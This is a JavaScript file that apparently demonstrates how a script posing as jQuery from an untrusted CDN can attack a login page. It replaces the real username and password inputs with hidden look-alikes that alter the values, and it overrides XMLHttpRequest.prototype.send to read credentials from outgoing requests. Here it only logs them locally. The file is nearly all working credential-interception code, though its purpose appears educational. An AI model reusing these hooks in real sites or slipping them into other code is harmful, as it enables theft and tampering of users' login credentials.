/*
 * jquery.from.untrusted.cdn.js
 *
 * this script will indirectly modify/read private-fields by hijacking dom-inputs and XMLHttpRequest
 */
/*jslint
    bitwise: true,
    browser: true,
    maxerr: 4,
    maxlen: 100,
    node: true,
    nomen: true,
    regexp: true,
    stupid: true
*/
(function () {
    'use strict';
    var XMLHttpRequestPrototypeSend, consoleLog;
    consoleLog = console.log;
    console.log = function () {
        document.querySelector('#textareaStdout').value += Array.from(arguments).join(' ') +
            '\n';
        consoleLog.apply(console, arguments);
    };
    // side-channel attack to modify private-fields in hijacked dom-inputs
    ['inputPassword', 'inputUsername'].forEach(function (element) {
    /*
     * this function will hide the original dom-inputs from the user,
     * and replace them with hijacked ones, that can arbitrarily modify data
     */
        var hijackElement;
        element = document.querySelector('#' + element);
        element.style.display = 'none';
        hijackElement = document.createElement('input');
        element.parentNode.insertBefore(hijackElement, element);
        hijackElement.id = element.id + '2';
        hijackElement.type = element.type;
        hijackElement.value = element.value;
        hijackElement.addEventListener('change', function () {
            // arbitrarily modify data and pass it back to original dom-inputs
            element.value = hijackElement.value + ' modified!';
        });
        element.value = element.value + ' modified!';
    });
    document.querySelector('#inputSubmit').addEventListener('click', function () {
        console.log('hijacked dom-input to modify field loginInstance.privateUsername=' +
            JSON.stringify(document.querySelector('#inputUsername').value));
        console.log('hijacked dom-input to modify field loginInstance.privatePassword=' +
            JSON.stringify(document.querySelector('#inputPassword').value) + '\n');
    });
    // side-channel attack to read private-fields from hijacked XMLHttpRequest
    XMLHttpRequestPrototypeSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function (data) {
    /*
     * this function will hijack XMLHttpRequest.prototype.send to indirectly read private-fields
     */
        try {
            data = JSON.parse(data);
            console.log('hijacked XMLHttpRequest.prototype.send to read field ' +
                'loginInstance.privateUsername=' + JSON.stringify(data.username));
            console.log('hijacked XMLHttpRequest.prototype.send to read field ' +
                'loginInstance.privatePassword=' + JSON.stringify(data.password) + '\n');
        } catch (ignore) {
        }
        XMLHttpRequestPrototypeSend.apply(this, arguments);
    };
    console.log('loaded script <script src="jquery.from.untrusted.cdn.js"></script>');
}());
